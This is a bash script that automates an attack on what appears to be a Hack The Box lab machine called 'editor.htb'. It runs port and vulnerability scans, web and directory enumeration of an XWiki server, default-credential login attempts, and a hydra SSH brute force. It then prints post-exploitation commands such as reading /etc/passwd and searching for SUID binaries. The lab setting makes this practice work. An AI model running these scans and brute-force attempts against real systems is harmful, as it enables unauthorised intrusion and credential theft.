#!/bin/bash
# SYSTEM 1: EDITOR - COMPLETE RECONNAISSANCE & EXPLOITATION
# Update IP and hostname, then run

S1_IP="10.10.11.80"
S1_NAME="editor.htb"
OUTPUT_DIR="$HOME/Downloads/system1_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

cd "$OUTPUT_DIR"

echo "=========================================="
echo "SYSTEM 1: EDITOR - COMPLETE TEST"
echo "=========================================="

# ============================================
# PHASE 1: RECONNAISSANCE
# ============================================
echo "[*] Phase 1: Reconnaissance"

# Connectivity
ping -c 4 $S1_IP > 01_ping.txt 2>&1

# Port scans
nmap -sC -sV -oN 02_initial_scan.txt $S1_IP
nmap -p- --min-rate 2000 -oN 03_full_scan.txt $S1_IP

# Web enumeration
curl -s -L http://$S1_IP/ > 04_web_root.html
curl -s -L http://$S1_NAME/ > 05_web_root_hostname.html
curl -s http://$S1_IP:8080/ > 06_jetty_root.html
curl -s http://$S1_IP:8080/xwiki/rest/ > 07_xwiki_rest.txt
curl -s http://$S1_IP:8080/xwiki/bin/view/Main/WebHome | head -200 > 08_xwiki_home.txt
curl -s http://$S1_IP:8080/xwiki/bin/login/XWiki/XWikiLogin | head -200 > 09_xwiki_login.txt

# Directory enumeration
ffuf -u http://$S1_NAME/FUZZ -w ~/Downloads/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -t 50 -o 10_ffuf_common.json -s 2>/dev/null
ffuf -u http://$S1_IP:8080/FUZZ -w ~/Downloads/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -t 50 -o 11_ffuf_jetty.json -s 2>/dev/null

# XWiki version check
curl -s http://$S1_IP:8080/xwiki/rest/ | grep -o "<version>.*</version>" > 12_xwiki_version.txt

# SSH banner
nc $S1_IP 22 < /dev/null > 13_ssh_banner.txt 2>&1

# ============================================
# PHASE 2: VULNERABILITY ANALYSIS
# ============================================
echo "[*] Phase 2: Vulnerability Analysis"

# XWiki version search
searchsploit xwiki > 14_xwiki_exploits.txt 2>&1

# Nmap vulnerability scripts
nmap -p 80,8080 --script vuln -oN 15_web_vuln.txt $S1_IP
nmap -p 22 --script ssh-auth-methods,ssh-hostkey -oN 16_ssh_analysis.txt $S1_IP

# WebDAV check (port 8080)
curl -X PROPFIND http://$S1_IP:8080/ > 17_webdav_propfind.txt 2>&1
curl -X OPTIONS http://$S1_IP:8080/ > 18_webdav_options.txt 2>&1

# ============================================
# PHASE 3: EXPLOITATION ATTEMPTS
# ============================================
echo "[*] Phase 3: Exploitation"

# XWiki default credentials
echo "Testing XWiki default credentials..."
for user in admin xwiki Admin; do
    for pass in admin xwiki password Password123; do
        curl -s -X POST http://$S1_IP:8080/xwiki/bin/login/XWiki/XWikiLogin \
            -d "j_username=$user&j_password=$pass" \
            -L -c cookies.txt > 19_xwiki_login_${user}_${pass}.html 2>&1
    done
done

# SSH brute force (small wordlist)
echo "admin
root
user
test" > users_small.txt

echo "admin
password
123456
Password123
admin123" > pass_small.txt

hydra -L users_small.txt -P pass_small.txt ssh://$S1_IP -t 4 -o 20_ssh_brute.txt 2>&1

# ============================================
# PHASE 4: POST-EXPLOITATION (if access gained)
# ============================================
echo "[*] Phase 4: Post-Exploitation (run if access gained)"
echo "If you gain access, run these commands:"
echo "  - whoami"
echo "  - id"
echo "  - uname -a"
echo "  - cat /etc/passwd"
echo "  - sudo -l"
echo "  - find / -perm -4000 2>/dev/null"
echo "  - cat /root/root.txt 2>/dev/null"
echo "  - cat /home/*/user.txt 2>/dev/null"

echo ""
echo "=========================================="
echo "SYSTEM 1: EDITOR - COMPLETE"
echo "=========================================="
echo "Results saved to: $OUTPUT_DIR"
ls -lh "$OUTPUT_DIR"

